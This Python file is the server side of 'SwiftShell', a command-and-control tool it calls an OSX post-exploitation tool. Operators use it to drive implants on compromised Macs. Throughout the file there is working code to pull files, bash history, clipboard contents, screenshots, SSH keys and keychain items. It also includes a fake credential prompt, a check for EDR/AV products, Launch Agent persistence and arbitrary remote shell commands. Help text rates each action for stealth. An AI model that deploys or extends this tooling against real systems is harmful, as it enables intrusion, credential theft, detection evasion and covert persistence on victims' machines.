import socket
import os
from threading import Thread 
from queue import Queue
import ssl
import sys
import subprocess

##first set up ssl for this server to properly run on ssl:
##1. openssl req -new -newkey rsa:1024 -nodes -out ca.csr -keyout ca.key
##2. openssl x509 -trustout -signkey ca.key -days 365 -req -in ca.csr -out ca.pem
##
##3. reference ca.pem and ca.key in the "context.load_cert_chain setting below in the start_server() function
##4. can also set up iptables on the server to restrict source connections from certain ranges:
##iptables -A INPUT -i eth1 -m iprange --src-range x.x.x.x-x.x.x.x -j ACCEPT
##iptables -P INPUT DROP



print("<\033[33m-----------------------------------------------------------------\033[0m>")
print("*            __           _  __ _   __ _          _ _             *")
print("*           / _\ _      _(_)/ _| |_/ _\ |__   ___| | |            *")
print("*           \ \ \ \ /\ / / | |_| __\ \| '_ \ / _ \ | |            *")
print("*           _\ \ \ V  V /| |  _| |__\ \ | | |  __/ | |            *")
print("*           \__/  \_/\_/ |_|_|  \__\__/_| |_|\___|_|_|            *")
print('*                                                                 *')
print('*                                                                 *')
print("*                              _.---._                            *")
print("*                          .'\"\".'/|\`.\"\"'.                        *")
print("*                         :  .' / | \ `.  :                       *")
print("*                         '.'  /  |  \  `.'                       *")
print("*                          `. /   |   \ .'                        *")
print("*                            `-.__|__.-'                          *")
print('*                                                                 *')
print('*                                                                 *')
print("* \033[92mOSX Post Exploitation Tool (client written in Swift)\033[0m            *")
print("* \033[92mauthor: @cedowens\033[0m                                               *")
print("<\033[33m-----------------------------------------------------------------\033[0m>")


class ClientThread(Thread): 
 
    def __init__(self,ip,port,connection,session,srvport): 
        Thread.__init__(self) 
        self.ip = ip 
        self.port = port
        print("[+] \033[92m[SESSION %s]: Connection received from %s:%s\033[0m" % (str(session),str(ip),str(port)))

        while True:
            command = input("\033[34m[SESSION %s: %s]>>>\033[0m " % (str(session),str(ip)))
            if 'help' in command:
                print("-"*100)
                print("\033[33mHelp menu:\033[0m")
                print("--->COMMANDS<---")
                print(">\033[33msysteminfo\033[0m: Return useful system information: \033[92mIS OPSEC SAFE\033[0m")
                print(">\033[33mwhoami\033[0m: Show current user identity: \033[92mIS OPSEC SAFE\033[0m")
                print(">\033[33mcd [directory]\033[0m: cd to the directory specified (ex: cd /home): \033[92mIS OPSEC SAFE\033[0m")
                print(">\033[33mlistdir\033[0m: list files and directories: \033[92mIS OPSEC SAFE\033[0m")
                print(">\033[33mdownload [filename]\033[0m: after you cd to directory of interest, download files of interest (one at a time): \033[92mIS OPSEC SAFE\033[0m")
                print(">\033[33mlistusers\033[0m: List users: \033[92mIS OPSEC SAFE\033[0m")
                print(">\033[33maddresses\033[0m: List internal address(es) for this host: \033[92mIS OPSEC SAFE\033[0m")
                print(">\033[33mlcwd: Show current server working directory")
                print(">\033[33mpwd: Show working directory on host: \033[92mIS OPSEC SAFE\033[0m")
                print(">\033[33mcat [filename]: Display file contents \033[92mIS OPSEC SAFE\033[0m")
                print(">\033[33mprompt\033[0m: Propmpt the user to enter credentials: \033[91mMAY NOT BE OPSEC SAFE (osascript invoked)\033[0m")
                print(">\033[33muserhist\033[0m: Grab bash history: \033[92mIS OPSEC SAFE\033[0m")
                print(">\033[33mclipboard\033[0m: Grab text in the user's clipboard: \033[92mIS OPSEC SAFE\033[0m")
                print(">\033[33mconnections\033[0m: Show active network connections: \033[91mMAY NOT BE OPSEC SAFE (lsof invoked)\033[0m")
                print(">\033[33mchecksecurity\033[0m: Search for common EDR/AV products: \033[92mIS OPSEC SAFE\033[0m")
                print(">\033[33mscreenshot\033[0m: Grap a screenshot of the OSX host: \033[92mIS OPSEC SAFE\033[0m")
                print(">\033[33mpersist\033[0m: Add persistence as OSX Launch Agent. \033[91mMAY NOT BE OPSEC SAFE (launchctl load invoked to load the persistence)\033[0m")
                print(">\033[33munpersist\033[0m: Remove the login persistence. \033[91mMAY NOT BE OPSEC SAFE (launchctl unload invoked to unload the persistence)\033[0m")
                print(">\033[33mshell [shell command]\033[0m: Run a shell command...\033[91mNOT OPSEC SAFE (spawns processes for each shell command run)\033[0m")
                print('')
                print("--->OSQUERY<---")
                print(">\033[33mcheck_osquery\033[0m: Check to see if osquery is on this host: \033[92mIS OPSEC SAFE\033[0m")
                print(">\033[33mosquery_users\033[0m: Use osquery to pull back local users: \033[92mIS OPSEC SAFE\033[0m")
                print(">\033[33mosquery_loggedin\033[0m: Use osquery to pull logged in user info: \033[92mIS OPSEC SAFE\033[0m")
                print(">\033[33mosquery_usersshkeys\033[0m: Use osquery to pull ssh key info: \033[92mIS OPSEC SAFE\033[0m")
                print(">\033[33mosquery_knownhosts\033[0m: Use osquery to pull back ssh known_hosts: \033[92mIS OPSEC SAFE\033[0m")
                print(">\033[33mosquery_failedlogins\033[0m: Use osquery to pull back failed login and password last set info: \033[92mIS OPSEC SAFE\033[0m")
                print(">\033[33mosquery_apps\033[0m: Use osquery to pull back a list of apps: \033[92mIS OPSEC SAFE\033[0m")
                print(">\033[33mosquery_runningapps\033[0m: Use osquery to list currently running apps: \033[92mIS OPSEC SAFE\033[0m")
                print(">\033[33mosquery_arpcache\033[0m: Use osquery to pull the arp cache: \033[92mIS OPSEC SAFE\033[0m")
                print(">\033[33mosquery_keychainitems\033[0m: Use osquery to list keychain items: \033[92mIS OPSEC SAFE\033[0m")
                print(">\033[33mosquery_osversion\033[0m: Use osquery to pull OS version info: \033[92mIS OPSEC SAFE\033[0m")
                print(">\033[33mosquery_systeminfo\033[0m: Use osquery to pull basic system info: \033[92mIS OPSEC SAFE\033[0m")
                print(">\033[33mosquery_wifi\033[0m: Use osquery to pull wifi info: \033[92mIS OPSEC SAFE\033[0m")
                print(">\033[33mosquery_processinfo\033[0m: Use osquery to process info: \033[92mIS OPSEC SAFE\033[0m")
                print(">\033[33mosquery_interfaces\033[0m: Use osquery to list local network interfaces: \033[92mIS OPSEC SAFE\033[0m")
                print('')
                print("--->OTHER<---")
                print(">\033[33mexit\033[0m: Exit the session and stop the client")
                print("-"*100)
    
            elif 'exit' in command:
                print('Exiting now...')
                connection.send(command.encode('utf8'))
                y = connection.recv(2048)
                z = y.decode('utf8')
                print("----Server still listening on port %s----" % str(srvport))
                break
            elif 'lcwd' in command:
                x = subprocess.getstatusoutput("pwd")
                print("Current server working directory:")
                print(str(x).replace("(0, '", '').replace("')",''))
            elif (('whoami' in command) and ('shell' not in command)):
                connection.send(command.encode('utf8'))
                y = connection.recv(1024)
                z = y.decode('utf8').replace("(0, '", '').replace("')",'')
                print("\033[92mUser Context:\033[0m %s" %str(z))

            elif (('pwd' in command) and ('shell' not in command)):
                connection.send(command.encode('utf8'))
                data = connection.recv(1024)
                data2 = data.decode('utf8').replace("\\n", '\n').replace("(0, '", '').replace("')",'').replace("!EOF!",'')
                print("\033[92m%s\033[0m" % str(data2))

            
            elif (('cat' in command) and ('shell' not in command)):
                connection.send(command.encode('utf8'))
                data = connection.recv(8192)
                if len(data) < 8192:
                    z = data.decode('utf8').replace("\\n", '\n').replace("(0, '", '').replace("')",'').replace(", ", "\n").strip()
                    print("\033[92m%s\033[0m" % str(z))
                else:
                    while True:
                        g = connection.recv(8192)
                        end = bytes('!EOF!', encoding='utf-8')
                        if end in g:
                            break
                        data = data + g
                    z = data.decode('utf8').replace("\\n", '\n').replace("(0, '", '').replace("')",'').replace(", ", "\n").replace("!EOF!",'').strip()
                    print("\033[92m%s\033[0m" % str(z))
                    
            elif 'listdir' in command:
                connection.send(command.encode('utf8'))
                data = connection.recv(8192)
                if len(data) < 8192:
                    z = data.decode('utf8').replace(", ", "\n").replace("[", '').replace("]",'')
                    print("\033[93m%s\033[0m" % str(z))
                    
                else:
                    while True:
                        g = connection.recv(8192)
                        end = bytes('!EOF!', encoding='utf-8')
                        if end in g:
                            break
                        data = data + g
                    z = data.decode('utf8').replace("[", '').replace("]",'').replace("!EOF!",'')
                    print("\033[93m%s\033[0m" % str(z))
            elif 'connections' in command:
                connection.send(command.encode('utf8'))
                data = connection.recv(8192)

                if len(data) < 8192:
                    print("Current network connections:")
                    z = data.decode('utf8').replace("\\n", '\n').replace("(0, '", '').replace("')",'').replace(", ", "\n").strip()
                    print("\033[92m%s\033[0m" % str(z))
                    
                else:
                    while True:
                        g = connection.recv(8192)
                        end = bytes('!EOF!', encoding='utf-8')
                        if end in g:
                            break
                        data = data + g
                    print("Current network connections:")
                    z = data.decode('utf8').replace("\\n", '\n').replace("(0, '", '').replace("')",'').replace(", ", "\n").replace("!EOF!",'').strip()
                    print("\033[92m%s\033[0m" % str(z))

            elif 'check_osquery' in command:
                connection.send(command.encode('utf8'))
                data = connection.recv(8192)

                if len(data) < 8192:
                    z = data.decode('utf8').replace("\\n", '\n').replace("(0, '", '').replace("')",'').replace(", ", "\n").strip()
                    print("\033[92m%s\033[0m" % str(z))

                else:
                    while True:
                        g = connection.recv(8192)
                        end = bytes('!EOF!', encoding='utf-8')
                        if end in g:
                            break
                        data = data + g
                    z = data.decode('utf8').replace("\\n", '\n').replace("(0, '", '').replace("')",'').replace(", ", "\n").replace("!EOF!",'').strip()
                    print("\033[92m%s\033[0m" % str(z))

            elif 'osquery_processinfo' in command:
                connection.send(command.encode('utf8'))
                data = connection.recv(8192)

                if len(data) < 8192:
                    z = data.decode('utf8').replace("\\n", '\n').replace("(0, '", '').replace("')",'').replace(", ", "\n").strip()
                    print("\033[92m%s\033[0m" % str(z))

                else:
                    while True:
                        g = connection.recv(8192)
                        end = bytes('!EOF!', encoding='utf-8')
                        if end in g:
                            break
                        data = data + g
                    z = data.decode('utf8').replace("\\n", '\n').replace("(0, '", '').replace("')",'').replace(", ", "\n").replace("!EOF!",'').strip()
                    print("\033[92m%s\033[0m" % str(z))

            elif 'osquery_users' in command:
                connection.send(command.encode('utf8'))
                data = connection.recv(8192)

                if len(data) < 8192:
                    print("OSQuery Info Pulled Back:")
                    z = data.decode('utf8').replace("\\n", '\n').replace("(0, '", '').replace("')",'').replace(", ", "\n").strip()
                    print("\033[92m%s\033[0m" % str(z))

                else:
                    while True:
                        g = connection.recv(8192)
                        end = bytes('!EOF!', encoding='utf-8')
                        if end in g:
                            break
                        data = data + g
                    print("OSQuery Info Pulled Back:")
                    z = data.decode('utf8').replace("\\n", '\n').replace("(0, '", '').replace("')",'').replace(", ", "\n").replace("!EOF!",'').strip()
                    print("\033[92m%s\033[0m" % str(z))

            elif 'osquery_usersshkeys' in command:
                connection.send(command.encode('utf8'))
                data = connection.recv(8192)

                if len(data) < 8192:
                    print("OSQuery Info Pulled Back:")
                    z = data.decode('utf8').replace("\\n", '\n').replace("(0, '", '').replace("')",'').replace(", ", "\n").strip()
                    print("\033[92m%s\033[0m" % str(z))

                else:
                    while True:
                        g = connection.recv(8192)
                        end = bytes('!EOF!', encoding='utf-8')
                        if end in g:
                            break
                        data = data + g
                    print("OSQuery Info Pulled Back:")
                    z = data.decode('utf8').replace("\\n", '\n').replace("(0, '", '').replace("')",'').replace(", ", "\n").replace("!EOF!",'').strip()
                    print("\033[92m%s\033[0m" % str(z))

            elif 'osquery_runningapps' in command:
                connection.send(command.encode('utf8'))
                data = connection.recv(8192)

                if len(data) < 8192:
                    print("OSQuery Info Pulled Back:")
                    z = data.decode('utf8').replace("\\n", '\n').replace("(0, '", '').replace("')",'').replace(", ", "\n").strip()
                    print("\033[92m%s\033[0m" % str(z))

                else:
                    while True:
                        g = connection.recv(8192)
                        end = bytes('!EOF!', encoding='utf-8')
                        if end in g:
                            break
                        data = data + g
                    print("OSQuery Info Pulled Back:")
                    z = data.decode('utf8').replace("\\n", '\n').replace("(0, '", '').replace("')",'').replace(", ", "\n").replace("!EOF!",'').strip()
                    print("\033[92m%s\033[0m" % str(z))

            elif 'osquery_systeminfo' in command:
                connection.send(command.encode('utf8'))
                data = connection.recv(8192)

                if len(data) < 8192:
                    print("OSQuery Info Pulled Back:")
                    z = data.decode('utf8').replace("\\n", '\n').replace("(0, '", '').replace("')",'').replace(", ", "\n").strip()
                    print("\033[92m%s\033[0m" % str(z))

                else:
                    while True:
                        g = connection.recv(8192)
                        end = bytes('!EOF!', encoding='utf-8')
                        if end in g:
                            break
                        data = data + g
                    print("OSQuery Info Pulled Back:")
                    z = data.decode('utf8').replace("\\n", '\n').replace("(0, '", '').replace("')",'').replace(", ", "\n").replace("!EOF!",'').strip()
                    print("\033[92m%s\033[0m" % str(z))

            elif 'osquery_wifi' in command:
                connection.send(command.encode('utf8'))
                data = connection.recv(8192)

                if len(data) < 8192:
                    print("OSQuery Info Pulled Back:")
                    z = data.decode('utf8').replace("\\n", '\n').replace("(0, '", '').replace("')",'').replace(", ", "\n").strip()
                    print("\033[92m%s\033[0m" % str(z))

                else:
                    while True:
                        g = connection.recv(8192)
                        end = bytes('!EOF!', encoding='utf-8')
                        if end in g:
                            break
                        data = data + g
                    print("OSQuery Info Pulled Back:")
                    z = data.decode('utf8').replace("\\n", '\n').replace("(0, '", '').replace("')",'').replace(", ", "\n").replace("!EOF!",'').strip()
                    print("\033[92m%s\033[0m" % str(z))
                

            elif 'osquery_interfaces' in command:
                connection.send(command.encode('utf8'))
                data = connection.recv(8192)

                if len(data) < 8192:
                    print("OSQuery Info Pulled Back:")
                    z = data.decode('utf8').replace("\\n", '\n').replace("(0, '", '').replace("')",'').replace(", ", "\n").strip()
                    print("\033[92m%s\033[0m" % str(z))

                else:
                    while True:
                        g = connection.recv(8192)
                        end = bytes('!EOF!', encoding='utf-8')
                        if end in g:
                            break
                        data = data + g
                    print("OSQuery Info Pulled Back:")
                    z = data.decode('utf8').replace("\\n", '\n').replace("(0, '", '').replace("')",'').replace(", ", "\n").replace("!EOF!",'').strip()
                    print("\033[92m%s\033[0m" % str(z))

            elif 'osquery_osversion' in command:
                connection.send(command.encode('utf8'))
                data = connection.recv(8192)

                if len(data) < 8192:
                    print("OSQuery Info Pulled Back:")
                    z = data.decode('utf8').replace("\\n", '\n').replace("(0, '", '').replace("')",'').replace(", ", "\n").strip()
                    print("\033[92m%s\033[0m" % str(z))

                else:
                    while True:
                        g = connection.recv(8192)
                        end = bytes('!EOF!', encoding='utf-8')
                        if end in g:
                            break
                        data = data + g
                    print("OSQuery Info Pulled Back:")
                    z = data.decode('utf8').replace("\\n", '\n').replace("(0, '", '').replace("')",'').replace(", ", "\n").replace("!EOF!",'').strip()
                    print("\033[92m%s\033[0m" % str(z))

            elif 'osquery_keychainitems' in command:
                connection.send(command.encode('utf8'))
                data = connection.recv(8192)

                if len(data) < 8192:
                    print("OSQuery Info Pulled Back:")
                    z = data.decode('utf8').replace("\\n", '\n').replace("(0, '", '').replace("')",'').replace(", ", "\n").strip()
                    print("\033[92m%s\033[0m" % str(z))

                else:
                    while True:
                        g = connection.recv(8192)
                        end = bytes('!EOF!', encoding='utf-8')
                        if end in g:
                            break
                        data = data + g
                    print("OSQuery Info Pulled Back:")
                    z = data.decode('utf8').replace("\\n", '\n').replace("(0, '", '').replace("')",'').replace(", ", "\n").replace("!EOF!",'').strip()
                    print("\033[92m%s\033[0m" % str(z))
                    

            elif 'osquery_failedlogins' in command:
                connection.send(command.encode('utf8'))
                data = connection.recv(8192)

                if len(data) < 8192:
                    print("OSQuery Info Pulled Back:")
                    z = data.decode('utf8').replace("\\n", '\n').replace("(0, '", '').replace("')",'').replace(", ", "\n").strip()
                    print("\033[92m%s\033[0m" % str(z))

                else:
                    while True:
                        g = connection.recv(8192)
                        end = bytes('!EOF!', encoding='utf-8')
                        if end in g:
                            break
                        data = data + g
                    print("OSQuery Info Pulled Back:")
                    z = data.decode('utf8').replace("\\n", '\n').replace("(0, '", '').replace("')",'').replace(", ", "\n").replace("!EOF!",'').strip()
                    print("\033[92m%s\033[0m" % str(z))

            elif 'osquery_loggedin' in command:
                connection.send(command.encode('utf8'))
                data = connection.recv(8192)

                if len(data) < 8192:
                    print("OSQuery Info Pulled Back:")
                    z = data.decode('utf8').replace("\\n", '\n').replace("(0, '", '').replace("')",'').replace(", ", "\n").strip()
                    print("\033[92m%s\033[0m" % str(z))

                else:
                    while True:
                        g = connection.recv(8192)
                        end = bytes('!EOF!', encoding='utf-8')
                        if end in g:
                            break
                        data = data + g
                    print("OSQuery Info Pulled Back:")
                    z = data.decode('utf8').replace("\\n", '\n').replace("(0, '", '').replace("')",'').replace(", ", "\n").replace("!EOF!",'').strip()
                    print("\033[92m%s\033[0m" % str(z))


            elif 'osquery_apps' in command:
                connection.send(command.encode('utf8'))
                data = connection.recv(8192)

                if len(data) < 8192:
                    print("OSQuery Info Pulled Back:")
                    z = data.decode('utf8').replace("\\n", '\n').replace("(0, '", '').replace("')",'').replace(", ", "\n").strip()
                    print("\033[92m%s\033[0m" % str(z))

                else:
                    while True:
                        g = connection.recv(8192)
                        end = bytes('!EOF!', encoding='utf-8')
                        if end in g:
                            break
                        data = data + g
                    print("OSQuery Info Pulled Back:")
                    z = data.decode('utf8').replace("\\n", '\n').replace("(0, '", '').replace("')",'').replace(", ", "\n").replace("!EOF!",'').strip()
                    print("\033[92m%s\033[0m" % str(z))

            elif 'osquery_arpcache' in command:
                connection.send(command.encode('utf8'))
                data = connection.recv(8192)

                if len(data) < 8192:
                    print("OSQuery Info Pulled Back:")
                    z = data.decode('utf8').replace("\\n", '\n').replace("(0, '", '').replace("')",'').replace(", ", "\n").strip()
                    print("\033[92m%s\033[0m" % str(z))

                else:
                    while True:
                        g = connection.recv(8192)
                        end = bytes('!EOF!', encoding='utf-8')
                        if end in g:
                            break
                        data = data + g
                    print("OSQuery Info Pulled Back:")
                    z = data.decode('utf8').replace("\\n", '\n').replace("(0, '", '').replace("')",'').replace(", ", "\n").replace("!EOF!",'').strip()
                    print("\033[92m%s\033[0m" % str(z))

            elif 'osquery_knownhosts' in command:
                connection.send(command.encode('utf8'))
                data = connection.recv(8192)

                if len(data) < 8192:
                    print("OSQuery Info Pulled Back:")
                    z = data.decode('utf8').replace("\\n", '\n').replace("(0, '", '').replace("')",'').replace(", ", "\n").strip()
                    print("\033[92m%s\033[0m" % str(z))

                else:
                    while True:
                        g = connection.recv(8192)
                        end = bytes('!EOF!', encoding='utf-8')
                        if end in g:
                            break
                        data = data + g
                    print("OSQuery Info Pulled Back:")
                    z = data.decode('utf8').replace("\\n", '\n').replace("(0, '", '').replace("')",'').replace(", ", "\n").replace("!EOF!",'').strip()
                    print("\033[92m%s\033[0m" % str(z))

            elif (('cd ' in command) and ('shell' not in command)):
                connection.send(command.encode('utf8'))
                w = connection.recv(2048)
                z = w.decode('utf8').replace("(0, '", '').replace("')",'')
                if '/' in z:
                    print("\033[92m[+] Current directory changed to %s" % str(z))
                else:
                    print("Directory not found.")
            
            elif 'addresses' in command:
                connection.send(command.encode('utf8'))
                w = connection.recv(1024)
                print('IP address(es) found:')
                z = w.decode('utf8').replace("\\n", '\n').replace("(0, '", '').replace("')",'').replace(", ", '\n')
                print("\033[92m%s\033[0m" % str(z))
            elif 'listusers' in command:
                connection.send(command.encode('utf8'))
                w = connection.recv(1024)
                z = w.decode('utf8').replace("\\n", '\n').replace("(0, '", '').replace("')",'').replace(", ", '\n')
                print("\033[92m%s\033[0m" % str(z))
            elif 'userhist' in command:
                connection.send(command.encode('utf8'))
                data = connection.recv(8192)

                if len(data) < 8192:
                    file = 'userhist.txt'
                    f = open("%s" % file, "wb")
                    f.write(data)
                    f.close()
                    print('\033[92m[+] History data saved to "userhist.txt" in current server directory\033[0m')
                    
                else:
                    while True:
                        g = connection.recv(8192)
                        end = bytes('!EOF!', encoding='utf-8')
                        if end in g:
                            break
                        data = data + g
                    file = 'userhist.txt'
                    f = open("%s" % file, "wb")
                    f.write(data)
                    f.close()
                    print('\033[92m[+] History data saved to "userhist.txt" in current server directory\033[0m')
                
            elif 'screenshot' in command:
                
                connection.send(command.encode('utf8'))
                data = connection.recv(8192)
                while True:
                    g = connection.recv(8192)
                    end = bytes('!EOF!', encoding='utf-8')
                    if end in g:
                        break
                    data = data + g
                file = 'screenshot.jpg'
                f = open("%s" % file, "wb")
                f.write(data)
                f.close()
                print('\033[92m[+] Screenshot saved to "screenshot.jpg" in current server directory\033[0m')

            elif 'download ' in command:
                command2 = command.replace('download ', '')
                connection.send(command.encode('utf8'))
                data = connection.recv(8192)
                denied = bytes('Permission denied', encoding='utf-8')
                if denied in data:
                    print('\033[93m[-] This user does not have permissions to open %s' % str(command2))
                elif len(data) < 8192:
                    file = "%s" % str(command2)
                    f = open("%s" % file, "wb")
                    f.write(data)
                    f.close()
                    print('\033[93m[+] %s downloaded and saved to current server directory\033[0m' % str(command2))
                    
                else:
                    while True:
                        g = connection.recv(8192)
                        end = bytes('!EOF!', encoding='utf-8')
                        if end in g:
                            break
                        data = data + g
                    file = "%s" % str(command2)
                    f = open("%s" % file, "wb")
                    f.write(data)
                    f.close()
                    print('\033[93m[+] %s downloaded and saved to current server directory\033[0m' % str(command2))
        
            elif 'checksecurity' in command:
                connection.send(command.encode('utf8'))
                data = connection.recv(8192)

                if len(data) < 8192:
                    b = 0

                    if 'CbOsxSensorService' in str(data):
                        print('[+] \033[33mCarbon Black OSX Sensor installed\033[0m')
                        b = 1
                
                    if 'CbDefense' in str(data):
                        print('[+] \033[33mCarbon Black Defense A/V installed\033[0m')
                        b = 1
                
                    if ('ESET' in str(data) or '/eset' in str(data)):
                        print('[+] \033[33mESET A/V installed\033[0m')
                        b = 1
                
                    if ('Littlesnitch' in str(data) or 'Snitch' in str(data)):
                        print('[+] \033[33mLittle snitch firewall running\033[0m')
                        b = 1
                
                    if 'xagt' in str(data):
                        print('[+] \033[33mFireEye HX agent installed\033[0m')
                        b = 1
                
                    if 'falconctl' in str(data):
                        print('[+] \033[33mCrowdstrike Falcon agent installed\033[0m')
                        b = 1

                    if ('GlobalProtect' in str(data) or '/PanGPS' in str(data)):
                        print('[+] \033[33mGlobal Protect PAN VPN client running\033[0m')
                        b = 1

                    if 'OpenDNS' in str(data):
                        print('[+] \033[33mOpenDNS Client running\033[0m')
                        b = 1

                    if 'HostChecker' in str(data):
                        print('[+] \033[33mPulse VPN client running\033[0m')
                        b = 1

                    if b == 0:
                        print('[-] No security products found.')
                    
                else:
                    while True:
                        g = connection.recv(8192)
                        end = bytes('!EOF!', encoding='utf-8')
                        if end in g:
                            break
                        data = data + g

                    if 'CbOsxSensorService' in str(data):
                        print('[+] \033[33mCarbon Black OSX Sensor installed\033[0m')
                        b = 1
                
                    if 'CbDefense' in str(data):
                        print('[+] \033[33mCarbon Black Defense A/V installed\033[0m')
                        b = 1
                
                    if ('ESET' in str(data) or '/eset' in str(data)):
                        print('[+] \033[33mESET A/V installed\033[0m')
                        b = 1
                
                    if ('Littlesnitch' in str(data) or 'Snitch' in str(data)):
                        print('[+] \033[33mLittle snitch firewall running\033[0m')
                        b = 1
                
                    if 'xagt' in str(data):
                        print('[+] \033[33mFireEye HX agent installed\033[0m')
                        b = 1
                
                    if 'falconctl' in str(data):
                        print('[+] \033[33mCrowdstrike Falcon agent installed\033[0m')
                        b = 1

                    if ('GlobalProtect' in str(data) or '/PanGPS' in str(data)):
                        print('[+] \033[33mGlobal Protect PAN VPN client running\033[0m')
                        b = 1

                    if 'OpenDNS' in str(data):
                        print('[+] \033[33mOpenDNS Client running\033[0m')
                        b = 1

                    if 'HostChecker' in str(data):
                        print('[+] \033[33mPulse VPN client running\033[0m')
                        b = 1

                    if b == 0:
                        print('[-] No security products found.')
            
            elif 'persist' in command:
                connection.send(command.encode('utf8'))
                y = connection.recv(2048)
                z = y.decode('utf8').replace("(0, '", '').replace("')",'')
                print("\033[92m%s\033[0m" % str(z))
            elif 'unpersist' in command:
                connection.send(command.encode('utf8'))
                response = connection.recv(2048)
                z = response.decode('utf8').replace("(0, '", '').replace("')",'')
                print("\033[92m%s\033[0m" % str(z))
            elif 'prompt' in command:
                connection.send(command.encode('utf8'))
                w = connection.recv(8192)
                z = w.decode('utf8').replace("(0, '", '').replace("')", '')
                print(str(z))
            elif 'systeminfo' in command:
                connection.send(command.encode('utf8'))
                w = connection.recv(1024)
                z = w.decode('utf8').replace("(0, '", '').replace("')",'').replace(", ", '\n')
                print("\033[92m%s\033[0m" % str(z))
            elif 'clipboard' in command:
                connection.send(command.encode('utf8'))
                data = connection.recv(8192)
                if len(data) < 8192:
                    f = open('clipboard.txt','w')
                    f.write(data.decode('utf8').replace("(0, '", '').replace("')",''))
                    f.close()
                    print("\033[93m[+] Clipboard data written to 'clipboard.txt' in the current server directory.\033[0m")
                else:
                    while True:
                        g = connection.recv(8192)
                        end = bytes('!EOF!', encoding='utf-8')
                        if end in g:
                            break
                        data = data + g
                    f = open('clipboard.txt','w')
                    f.write(data.decode('utf8').replace("(0, '", '').replace("')",''))
                    f.close()
                    print("\033[93m[+] Clipboard data written to 'clipboard.txt' in the current server directory.\033[0m")
            elif 'shell ' in command:
                connection.send(command.encode('utf8'))
                data = connection.recv(8192)
                if len(data) < 8192:
                    z = data.decode('utf8').replace("\\n", '\n').replace("(0, '", '').replace("')",'').replace(", ", "\n")
                    print("\033[92m%s\033[0m" % str(z))
                    if '80(admin)' in str(z):
                        print("Your user context likely has sudo rights (based on groups).")
                else:
                    while True:
                        g = connection.recv(8192)
                        end = bytes('!EOF!', encoding='utf-8')
                        if end in g:
                            break
                        data = data + g
                    z = data.decode('utf8').replace("\\n", '\n').replace("(0, '", '').replace("')",'').replace(", ", "\n")
                    print("\033[92m%s\033[0m" % str(z))
                    if '80(admin)' in str(z):
                        print("Your user context likely has sudo rights (based on groups).")
            else:
                print("[-] Command not found")

            if not connection:
                break


context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
context.load_cert_chain('ca.pem','ca.key')
host = '127.0.0.1'
port = 443
srvport = port
session = 0
q = Queue()
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
ssock = context.wrap_socket(s, server_side=True)

try:
    ssock.bind((host,port))
except:
    print("Bind failed. Error: %s" % (str(sys.exc_info)))
    sys.exit()
    
threads = [] 
print('')
print('===>Server listening on port %s<====' % str(port))
print('')


while True:
    ssock.listen(20)
    (connection, (ip,port)) = ssock.accept()
    canary = connection.recv(16).decode('utf8')
    
    if 'SwiftShellR0ckZ!' in canary:
        q.put(connection)
        session = session + 1
        selector = session - 1
        conn = q.get(selector)
        newthread = ClientThread(ip,port,connection,session,srvport)
        threads.append(newthread)
        try:
            newthread.start()
        except:
            print("Thread did not start.")
            traceback.print_exc()
    else:
        connection.shutdown(1)
        connection.close()
     

 
for t in threads: 
    t.join()
